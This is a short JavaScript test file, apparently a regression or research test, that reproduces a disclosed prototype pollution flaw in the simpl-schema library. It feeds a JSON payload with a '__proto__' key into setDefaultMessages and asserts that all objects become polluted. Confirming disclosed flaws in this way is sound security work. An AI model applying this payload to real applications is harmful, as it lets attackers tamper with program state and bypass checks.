//https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
test("prototype pollution in simpl-schema", () => {
  const SimpleSchema = require("simpl-schema").default;
  let obj = {};

  expect({}.polluted).toBe(undefined);

  SimpleSchema.setDefaultMessages(
    JSON.parse('{"__proto__":{"polluted":"yes"}}')
  );
  expect({}.polluted).toBe("yes");
});
